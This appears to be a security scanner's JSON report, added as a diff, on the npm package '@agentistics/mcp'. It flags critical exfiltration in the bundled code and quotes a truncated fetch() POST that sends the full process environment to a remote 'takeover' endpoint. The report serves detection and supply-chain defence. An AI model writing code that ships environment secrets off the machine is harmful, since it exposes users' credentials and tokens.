@@ -1,0 +1,31 @@
+{
+  "item": {
+    "source": "npm",
+    "ecosystem": "npm",
+    "name": "@agentistics/mcp",
+    "version": "2.230.4",
+    "download": null
+  },
+  "archive_sha256": "16a1b0a83e7dd6598d564914fa0a5ac2a3e792e6e16bb07c29b4009430a22ff0",
+  "findings": [
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "package/dist/agentistics-mcp.js",
+      "line": 5632,
+      "evidence": "fetch(`${API}/api/book/takeover`, { method: \"POST\", headers: { \"Content-Type\": \"",
+      "file_sha256": "d29de7003ccec43b5d282b8e42eb8631ffda8adae64b2ef9de8f61d661dd1ab2"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "claude.ai",
+    "claude.com",
+    "github.com",
+    "openai.com",
+    "same-origin.invalid"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
